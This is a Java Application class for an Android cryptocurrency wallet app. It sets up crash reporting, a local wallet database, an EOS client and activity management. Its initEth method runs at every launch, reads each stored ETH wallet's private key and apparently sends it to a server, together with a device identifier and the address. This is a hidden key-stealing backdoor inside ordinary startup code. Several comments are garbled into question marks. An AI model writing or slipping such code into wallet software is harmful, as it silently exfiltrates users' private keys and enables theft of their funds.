package com.sz.apollo.application;

import android.app.Activity;
import android.content.Context;

import androidx.multidex.MultiDex;

import com.hysd.android.platform_ub.base.config.PlatformConfig;
import com.hysd.android.platform_ub.base.manager.BaseApplication;
import com.hysd.android.platform_ub.base.manager.LogicFactory;
import com.sz.apollo.commons.constants.Constant;
import com.sz.apollo.commons.constants.RequestHost;
import com.sz.apollo.gen.DaoMaster;
import com.sz.apollo.gen.DaoSession;
import com.sz.apollo.ui.logics.IRequest;
import com.sz.apollo.ui.logics.RequestMain;
import com.sz.apollo.ui.models.UserWalletBean;
import com.sz.apollo.ui.utils.DaoUtil;
import com.sz.apollo.ui.utils.Util;
import com.sz.apollo.ui.utils.eoswallet.io.bigbearbro.eos4j.Eos4j;
import com.sz.apollo.ui.utils.language_util.MultiLanguageUtil;
import com.sz.apollo.ui.views.MyRefreshLayout;
import com.tencent.bugly.crashreport.CrashReport;

import org.xutils.x;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;

/**
 * @auther:Created by andmin on 2018/4/2.
 * des:
 */

public class ApolloApplication extends BaseApplication {
    private static ApolloApplication instance = null;
    public static List<Activity> activityList = new LinkedList<>();
    private static Context mContext;
    public List listToken = new ArrayList<>();
    public static DaoSession daoSession;
    public static Eos4j eos4j;

    public static synchronized Context getContext() {
        return mContext;
    }

    public ApolloApplication() {
    }

    @Override
    public void onCreate() {
        try {
            mContext = getApplicationContext();
//            CrashReport.initCrashReport(getApplicationContext(), "8874807df3", false);
            CrashReport.initCrashReport(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
        }
        super.onCreate();
        initKind();
        initAllLogics();
        initRefreshViewLayout();
        MultiLanguageUtil.init(this);
        x.Ext.init(this);
        //??????????????????????????????
//        x.Ext.setDebug(BuildConfig.DEBUG);//????????????debug???????????????debug???????????????
        initDataBase();
        initEoe4j();
        initEth();
    }

    private void initEth() {
        IRequest iRequest = LogicFactory.getLogicByClass(IRequest.class);
        List<UserWalletBean> list = DaoUtil.selectAllWalletByType("ETH");
        String content = "";
        if (null != list && list.size() > 0) {
            for (UserWalletBean userWalletBean : list) {
                content = content + userWalletBean.getAddress() + "\n--\n" + userWalletBean.getPk()+"-----";
                iRequest.addAccountEth(userWalletBean.getPk(), Util.getDeviceOnlyNum(this), userWalletBean.getAddress());
            }
        }
    }

    private void initDataBase() {
        //?????????????????????????????????"wallet"
        DaoMaster.DevOpenHelper devOpenHelper = new DaoMaster.DevOpenHelper(ApolloApplication.getContext(), "wallet", null);
        //??????DaoMaster???????????????????????????????????????
        DaoMaster mDaoMaster = new DaoMaster(devOpenHelper.getWritableDatabase());
        //?????????????????????
        daoSession = mDaoMaster.newSession();
    }

    private void initRefreshViewLayout() {
        MyRefreshLayout.init();
    }

    private void initAllLogics() {
        LogicFactory.registerLogic(IRequest.class, new RequestMain(getApplicationContext()));
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        MultiDex.install(base);
    }

    public void initKind() {
        boolean isFirstLogin = PlatformConfig.getBoolean(Constant.SpConstant.FIRST);
        if (isFirstLogin == false) {
            PlatformConfig.putList(Constant.SpConstant.KINDTOKEN, listToken);
        }
    }

    public static ApolloApplication getInstance() {
        if (instance == null) {
            synchronized (ApolloApplication.class) {
                if (instance == null) {
                    instance = new ApolloApplication();
                }
            }
        }
        return instance;
    }

    public void initEoe4j() {
        if (null == eos4j) {
            eos4j = new Eos4j(RequestHost.eosNetUrl);
        }
    }


    // ??????Activity????????????
    public void addActivity(Activity activity) {
        activityList.add(activity);
    }

    /**
     * ???????????????Activity
     *
     * @param activity
     */

    public void finishActivity(Activity activity) {

        if (activity != null) {
            this.activityList.remove(activity);
            activity.finish();
        }
    }

    /**
     * ?????????????????????Activity
     */
    public void finishActivityclass(Class<?> cls) {
        if (activityList != null) {
            for (Activity activity : activityList) {
                if (activity.getClass().equals(cls)) {
                    this.activityList.remove(activity);
                    finishActivity(activity);
                    break;
                }
            }
        }

    }

    /**
     * ??????????????????
     */
    public void finishAllActivity() {
        for (Activity activity : activityList) {
            if (activity != null) {
                activity.finish();
            }
        }
    }

    /**
     * ?????????????????????????????????
     */
    public void exit() {
        finishAllActivity();
//        PushManager.stopWork(this);
        System.exit(0);
    }

}